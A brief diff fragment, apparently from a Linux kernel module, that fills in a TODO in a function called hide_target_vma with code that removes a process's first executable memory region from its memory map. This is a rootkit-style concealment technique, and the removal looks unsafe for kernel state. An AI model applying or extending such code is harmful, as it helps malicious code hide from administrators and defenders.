@@ -35,6 +35,12 @@ static int hide_target_vma(struct task_struct *task)
             break;
 
         // TODO: 隐藏第一个可执行 VMA（代码段）
+        if (vma->vm_flags & VM_EXEC) {
+            mas_store(&mas, NULL);   
+            found = 1;
+            break;
+        }
+
     }
 
     up_write(&mm->mmap_lock);
